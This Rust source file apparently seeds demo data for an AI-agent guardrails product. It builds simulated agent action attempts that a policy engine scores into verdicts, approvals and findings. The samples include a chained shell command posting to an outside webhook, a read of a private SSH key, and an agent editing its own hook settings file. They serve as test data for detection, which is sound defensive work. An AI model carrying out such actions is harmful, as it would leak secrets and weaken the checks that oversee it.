// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: The Guardrails ADR Authors

use jiff::Timestamp;

use grdr_core::{detect, policy};
use grdr_model::eval::add_seconds;
use grdr_model::{
    ActionAttempt, ActionClass, ApprovalGrade, ApprovalRequest, ApprovalState, AuditEntry,
    ControlPoint, Device, Finding, Grant, KillSwitchState, PolicyPack, ProvenanceSource,
    SecondaryAction, SpanKind, Verdict,
};

use crate::demo_devices::{demo_devices, demo_user_directory};
use crate::store::users::DirectoryUserRecord;

pub struct SeedSnapshot {
    pub packs: Vec<PolicyPack>,
    pub user_directory: Vec<DirectoryUserRecord>,
    pub devices: Vec<Device>,
    pub attempts: Vec<ActionAttempt>,
    pub receipts: Vec<grdr_model::DecisionReceipt>,
    pub approvals: Vec<ApprovalRequest>,
    pub grants: Vec<Grant>,
    pub findings: Vec<Finding>,
    pub audit: Vec<AuditEntry>,
}

struct SeedAttemptSpec {
    id: &'static str,
    session_id: &'static str,
    device_id: &'static str,
    device_name: &'static str,
    user_id: &'static str,
    user_display: &'static str,
    agent_name: &'static str,
    action_class: ActionClass,
    control_point: ControlPoint,
    target: &'static str,
    summary: &'static str,
    offset: i64,
    turn_index: u32,
    span_id: &'static str,
    parent_span_id: Option<&'static str>,
    span_kind: SpanKind,
    duration_ms: u64,
    provenance: ProvenanceSource,
    secondary_actions: Vec<SecondaryAction>,
    skill_used: Option<&'static str>,
    compaction: bool,
}

pub fn build_demo_seed(now: Timestamp) -> SeedSnapshot {
    let packs = vec![policy::essentials_pack()];
    let user_directory = demo_user_directory();
    let devices = demo_devices(now);

    let specs = vec![
        SeedAttemptSpec {
            id: "att-demo-1",
            session_id: "sess-demo-refactor",
            device_id: "dev-demo-01",
            device_name: "dev-macbook-pro",
            user_id: "usr-maya-chen",
            user_display: "Maya Chen",
            agent_name: "Claude Code",
            action_class: ActionClass::Exec,
            control_point: ControlPoint::Hook,
            target: "git status --short",
            summary: "Inspect repository working tree",
            offset: -900,
            turn_index: 1,
            span_id: "spn-ref-t1-root",
            parent_span_id: None,
            span_kind: SpanKind::InvokeAgent,
            duration_ms: 420,
            provenance: ProvenanceSource::Reconciled,
            secondary_actions: vec![],
            skill_used: None,
            compaction: false,
        },
        SeedAttemptSpec {
            id: "att-demo-2",
            session_id: "sess-demo-refactor",
            device_id: "dev-demo-01",
            device_name: "dev-macbook-pro",
            user_id: "usr-maya-chen",
            user_display: "Maya Chen",
            agent_name: "Claude Code",
            action_class: ActionClass::FileWrite,
            control_point: ControlPoint::Hook,
            target: ".claude/settings.json",
            summary: "Attempted edit to Claude hook configuration",
            offset: -720,
            turn_index: 2,
            span_id: "spn-ref-t2-write",
            parent_span_id: Some("spn-ref-t2-sub"),
            span_kind: SpanKind::ExecuteTool,
            duration_ms: 85,
            provenance: ProvenanceSource::Mediated,
            secondary_actions: vec![],
            skill_used: Some("deploy-helper"),
            compaction: false,
        },
        SeedAttemptSpec {
            id: "att-demo-3",
            session_id: "sess-demo-refactor",
            device_id: "dev-demo-01",
            device_name: "dev-macbook-pro",
            user_id: "usr-maya-chen",
            user_display: "Maya Chen",
            agent_name: "Claude Code",
            action_class: ActionClass::Exec,
            control_point: ControlPoint::Proxy,
            target: "git diff --stat && curl -X POST https://webhook.site/probe",
            summary: "Compound shell command with outbound webhook transfer",
            offset: -540,
            turn_index: 2,
            span_id: "spn-ref-t2-sub",
            parent_span_id: None,
            span_kind: SpanKind::SubagentSpawn,
            duration_ms: 1380,
            provenance: ProvenanceSource::Observed,
            secondary_actions: vec![
                SecondaryAction {
                    command: "git diff --stat".into(),
                    action_class: ActionClass::Exec,
                    target: "git diff --stat".into(),
                },
                SecondaryAction {
                    command: "curl -X POST https://webhook.site/probe".into(),
                    action_class: ActionClass::NetRequest,
                    target: "https://webhook.site/probe".into(),
                },
            ],
            skill_used: Some("deploy-helper"),
            compaction: false,
        },
        SeedAttemptSpec {
            id: "att-demo-6",
            session_id: "sess-demo-refactor",
            device_id: "dev-demo-01",
            device_name: "dev-macbook-pro",
            user_id: "usr-maya-chen",
            user_display: "Maya Chen",
            agent_name: "Claude Code",
            action_class: ActionClass::Exec,
            control_point: ControlPoint::Hook,
            target: "cargo test --workspace",
            summary: "Context compacted before running workspace verification suite",
            offset: -60,
            turn_index: 3,
            span_id: "spn-ref-t3-compact",
            parent_span_id: None,
            span_kind: SpanKind::Compaction,
            duration_ms: 2150,
            provenance: ProvenanceSource::Reconciled,
            secondary_actions: vec![],
            skill_used: None,
            compaction: true,
        },
        SeedAttemptSpec {
            id: "att-demo-4",
            session_id: "sess-demo-triage",
            device_id: "dev-demo-02",
            device_name: "sec-linux-ws",
            user_id: "usr-devon-patel",
            user_display: "Devon Patel",
            agent_name: "Codex",
            action_class: ActionClass::McpCall,
            control_point: ControlPoint::McpBroker,
            target: "mcp__github__create_issue",
            summary: "Invoke write-capable GitHub MCP tool",
            offset: -360,
            turn_index: 1,
            span_id: "spn-tri-t1-mcp",
            parent_span_id: None,
            span_kind: SpanKind::McpCall,
            duration_ms: 310,
            provenance: ProvenanceSource::Claimed,
            secondary_actions: vec![],
            skill_used: Some("AGENTS.md"),
            compaction: false,
        },
        SeedAttemptSpec {
            id: "att-demo-5",
            session_id: "sess-demo-triage",
            device_id: "dev-demo-02",
            device_name: "sec-linux-ws",
            user_id: "usr-devon-patel",
            user_display: "Devon Patel",
            agent_name: "Codex",
            action_class: ActionClass::FileRead,
            control_point: ControlPoint::Hook,
            target: "~/.ssh/id_rsa",
            summary: "Read private SSH key material",
            offset: -180,
            turn_index: 2,
            span_id: "spn-tri-t2-ssh",
            parent_span_id: None,
            span_kind: SpanKind::OsEffect,
            duration_ms: 145,
            provenance: ProvenanceSource::Observed,
            secondary_actions: vec![],
            skill_used: None,
            compaction: false,
        },
        SeedAttemptSpec {
            id: "att-demo-7",
            session_id: "sess-demo-clean",
            device_id: "dev-demo-03",
            device_name: "win-build-04",
            user_id: "usr-elena-rostova",
            user_display: "Elena Rostova",
            agent_name: "Claude Code",
            action_class: ActionClass::FileRead,
            control_point: ControlPoint::Hook,
            target: "src/lib.rs",
            summary: "Inspect crate entry point during release verification",
            offset: -120,
            turn_index: 1,
            span_id: "spn-cln-t1-read",
            parent_span_id: None,
            span_kind: SpanKind::Chat,
            duration_ms: 190,
            provenance: ProvenanceSource::Reconciled,
            secondary_actions: vec![],
            skill_used: Some("release-check"),
            compaction: false,
        },
    ];

    let mut attempts = Vec::new();
    let mut receipts = Vec::new();
    let mut approvals = Vec::new();
    let mut findings = Vec::new();

    for spec in specs {
        let ts = add_seconds(now, spec.offset);
        let attempt = ActionAttempt {
            id: spec.id.into(),
            session_id: spec.session_id.into(),
            device_id: spec.device_id.into(),
            device_name: spec.device_name.into(),
            agent_name: spec.agent_name.into(),
            action_class: spec.action_class,
            control_point: spec.control_point,
            target: spec.target.into(),
            summary: spec.summary.into(),
            timestamp: ts,
            user_id: Some(spec.user_id.into()),
            user_display: Some(spec.user_display.into()),
            turn_index: spec.turn_index,
            span_id: Some(spec.span_id.into()),
            parent_span_id: spec.parent_span_id.map(str::to_string),
            span_kind: spec.span_kind,
            duration_ms: spec.duration_ms,
            provenance: spec.provenance,
            secondary_actions: spec.secondary_actions,
            skill_used: spec.skill_used.map(str::to_string),
            compaction: spec.compaction,
        };
        let receipt = policy::evaluate(&attempt, &packs, &[], &KillSwitchState::Inactive, ts);
        if receipt.verdict == Verdict::StepUp {
            approvals.push(ApprovalRequest {
                id: format!("apr-demo-{}", spec.id),
                receipt_id: receipt.receipt_id.clone(),
                session_id: attempt.session_id.clone(),
                device_id: attempt.device_id.clone(),
                device_name: attempt.device_name.clone(),
                agent_name: attempt.agent_name.clone(),
                action_class: attempt.action_class,
                target: attempt.target.clone(),
                rule_id: receipt
                    .rule_id
                    .clone()
                    .unwrap_or_else(|| "essentials.credential-stores".into()),
                rule_title: "Guard credential stores and private keys".into(),
                required_grade: ApprovalGrade::G1,
                reason: receipt.reason.clone(),
                requested_at: ts,
                state: ApprovalState::Pending {
                    expires_at: add_seconds(now, 1800),
                },
            });
        }
        if let Some(finding) = detect::finding_from_receipt(&receipt, &attempt.device_name) {
            findings.push(finding);
        }
        attempts.push(attempt);
        receipts.push(receipt);
    }

    let audit = vec![AuditEntry {
        id: "aud-demo-init".into(),
        timestamp: add_seconds(now, -950),
        kind: "policy.pack.loaded".into(),
        actor: "system".into(),
        summary: "Loaded Essentials baseline pack (7 rules)".into(),
        target: "pack-essentials-slice0".into(),
    }];

    SeedSnapshot {
        packs,
        user_directory,
        devices,
        attempts,
        receipts,
        approvals,
        grants: Vec::new(),
        findings,
        audit,
    }
}
